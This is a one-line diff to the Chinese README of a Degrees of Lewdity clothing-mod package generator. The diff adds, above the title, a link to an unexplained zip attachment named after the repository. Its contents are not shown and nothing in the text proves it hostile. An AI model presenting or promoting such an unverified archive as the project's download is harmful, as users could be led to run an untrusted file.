@@ -1,3 +1,4 @@
+[createshit-master.zip](https://github.com/user-attachments/files/17146732/createshit-master.zip)
 # dol衣服美化模组自动生成器
 由北极星制作的傻瓜版模组生成器，用于生成可供modloader加载的模组包，支持新增衣物及美化模组。
 
